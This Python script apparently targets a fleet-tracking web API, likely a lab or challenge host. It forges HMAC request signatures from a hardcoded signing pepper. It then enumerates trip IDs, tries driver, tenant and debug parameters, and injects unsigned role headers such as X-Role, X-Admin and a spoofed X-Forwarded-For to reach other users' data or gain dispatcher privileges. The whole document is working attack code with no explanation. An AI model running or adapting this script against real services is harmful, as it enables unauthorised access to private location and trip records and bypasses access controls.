import sys, time, hmac, hashlib, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from concurrent.futures import ThreadPoolExecutor

BASE = "https://web-198ec1caaeb6fd82.web.h7tex.com"
PEPPER = "fleetlink_signing_pepper_v3"
DEV = "flt-11111111-2222-3333-4444-555555555555"
BASE_LEN = 147


def sign(method, path, q, ts, device=DEV):
    k = hashlib.sha256((PEPPER + ":" + device).encode()).digest()
    return hmac.new(k, "\n".join([method, path, q, ts]).encode(), hashlib.sha256).hexdigest()


def go(q="", path="/api/v1/trips", device=DEV, tries=3):
    for _ in range(tries):
        ts = str(int(time.time()))
        h = {"X-Device-Id": device, "X-Ts": ts, "X-Sig": sign("GET", path, q, ts, device)}
        r = urllib.request.Request(BASE + path + (("?" + q) if q else ""), method="GET", headers=h)
        try:
            with urllib.request.urlopen(r, timeout=25) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as ex:
            time.sleep(0.6)
    return "ERR", "timeout"


def diff(tag, q="", path="/api/v1/trips", device=DEV):
    s, b = go(q, path, device)
    if len(b) != BASE_LEN or s != 200 or path != "/api/v1/trips":
        print(f"  {tag:46s} {s} len={len(b)} {b[:170].strip()}")
    return b


print("== A: trip id selectors")
for n in ["id", "trip", "trip_id", "tid", "ids", "ref", "order", "pod"]:
    for v in ["T-8801", "T-8802", "T-8803", "T-9999", "T-0001", "all"]:
        diff(f"{n}={v}", f"{n}={v}")

print("== B: trip id enumeration (positional)")
for i in range(8790, 8836):
    diff(f"id=T-{i}", f"id=T-{i}")

print("== C: driver/tenant selectors")
for n in ["driver", "driver_id", "dev", "device", "who", "as", "role", "tenant", "account", "org", "user", "name"]:
    for v in ["D-01", "d01", "1", "dispatcher", "dispatch", "covoi", "fleet"]:
        diff(f"{n}={v}", f"{n}={v}")

print("== D: pagination / volume params")
for q in ["limit=1000", "offset=2", "page=2", "per_page=100", "n=100", "count=100", "all=1", "full=1",
          "verbose=1", "debug=1", "expand=all", "include=all", "fields=all", "since=2000", "depth=2"]:
    diff(q, q)

print("== E: header-based role (unsigned by scheme)")
for hn, hv in [("X-Role", "dispatcher"), ("X-Scope", "fleet"), ("X-Fleet", "1"), ("X-Admin", "1"),
               ("X-Debug", "1"), ("X-Internal", "1"), ("X-User", "dispatcher"), ("X-Device-Role", "dispatcher"),
               ("X-Sig-Role", "dispatcher"), ("X-Manifest", "1"), ("Cookie", "role=dispatcher"),
               ("Authorization", "Bearer dispatcher"), ("X-Forwarded-For", "127.0.0.1")]:
    s, b = go("")
    r = None
    ts = str(int(time.time()))
    h = {"X-Device-Id": DEV, "X-Ts": ts, "X-Sig": sign("GET", "/api/v1/trips", "", ts), hn: hv}
    req = urllib.request.Request(BASE + "/api/v1/trips", method="GET", headers=h)
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            r = (resp.status, resp.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        r = (e.code, e.read().decode("utf-8", "replace"))
    if len(r[1]) != BASE_LEN or r[0] != 200:
        print(f"  {hn}: {hv:24s} {r[0]} len={len(r[1])} {r[1][:170].strip()}")

print("done")
